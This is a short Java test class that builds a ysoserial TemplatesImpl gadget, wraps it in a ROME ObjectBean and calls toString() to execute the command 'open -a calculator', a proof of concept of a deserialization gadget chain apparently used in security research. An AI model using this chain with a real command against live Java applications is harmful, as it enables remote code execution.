package top.lz2y.test;


import com.sun.syndication.feed.impl.ObjectBean;
import top.lz2y.tools.FileUtil;
import ysoserial.payloads.util.Gadgets;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

/**
 * description: ByteTest
 * date: 2021/7/22 9:42
 * author: lz2y
 * version: 1.0
 */
public class ByteTest {
    public static void main(String[] args) throws Exception{
        Object o = Gadgets.createTemplatesImpl("open -a calculator");
        ObjectBean delegate = new ObjectBean(Templates.class, o);
//        ObjectBean root = new ObjectBean(ObjectBean.class, delegate);
        delegate.toString();
    }
}
